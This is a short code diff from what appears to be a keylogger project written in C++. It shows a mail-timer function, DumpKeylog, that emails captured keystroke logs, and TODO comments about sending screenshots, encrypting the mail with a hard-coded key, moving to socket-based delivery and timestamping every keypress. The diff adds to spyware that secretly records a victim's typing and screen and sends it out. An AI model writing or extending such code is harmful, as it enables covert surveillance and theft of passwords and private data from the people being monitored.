@@ -22,6 +22,11 @@ KeyboardManager keyboardManager;
 // TODO Encode screen buffer into base64
 // TODO encrypt mail with a hard coded public key
 // TODO Potentially change from email based delivery system to socket based one
+// TODO potentially add timestamp to every key pressed (or atleast every line)
+// TODO compress screenshots
+// TODO create new email
+// TODO look for strings in executable
+// TODO potentially send debug logs back to user as well
 
 // MailTimer Handler function
 void DumpKeylog()
@@ -37,8 +42,8 @@ void DumpKeylog()
 		return;
 	}
 
-	std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
-	int x = Mail::SendMail("Log [" + filename + "]", "", filename);
+	// std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
+	int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);
 
 	if (x != 7)
 		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
